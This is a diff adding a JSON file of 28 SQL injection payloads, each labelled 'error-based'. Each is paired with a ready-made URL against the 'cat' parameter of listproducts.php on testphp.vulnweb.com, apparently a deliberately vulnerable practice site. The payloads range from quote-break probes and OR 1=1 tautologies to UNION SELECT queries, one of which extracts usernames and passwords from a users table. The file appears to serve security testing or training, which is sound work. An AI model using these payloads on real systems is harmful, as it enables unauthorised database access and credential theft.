@@ -1,0 +1,170 @@
+[
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "1'",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "1\"",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%22"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "[1]",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%5B1%5D"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "1`",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%60"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "1\\",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%5C"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "1/*!1111'*/",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%2F%2A%211111%27%2A%2F"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "1'||'asd'||'",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27%7C%7C%27asd%27%7C%7C%27"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "1' or '1'='1",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1%27+or+%271%27%3D%271"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' AND 1=1 --",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+AND+1%3D1+--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' AND 1=2 --",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+AND+1%3D2+--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "\" AND 1=1 --",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22+AND+1%3D1+--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "\" AND 1=2 --",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22+AND+1%3D2+--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' UNION SELECT null,null --",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+UNION+SELECT+null%2Cnull+--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "\" UNION SELECT null,null --",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22+UNION+SELECT+null%2Cnull+--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 'a'='a",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%27a%27%3D%27a"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 'a'='b",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+%27a%27%3D%27b"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1#",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1%23"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=2#",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D2%23"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1 LIMIT 1--",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+LIMIT+1--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1 ORDER BY 1--",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+ORDER+BY+1--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR EXISTS(SELECT * FROM users)--",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT)--",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3DCAST%28%28SELECT+COUNT%28%2A%29+FROM+information_schema.tables%29+AS+INT%29--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1 UNION SELECT 1,2,3--",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+UNION+SELECT+1%2C2%2C3--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1 UNION SELECT username, password FROM users--",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1+UNION+SELECT+username%2C+password+FROM+users--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1;--",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1%3B--"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1/*",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1%2F%2A"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "' OR 1=1-- -",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%27+OR+1%3D1--+-"
+  },
+  {
+    "type": "error-based",
+    "param": "cat",
+    "payload": "\" OR 1=1-- -",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=%22+OR+1%3D1--+-"
+  }
+]
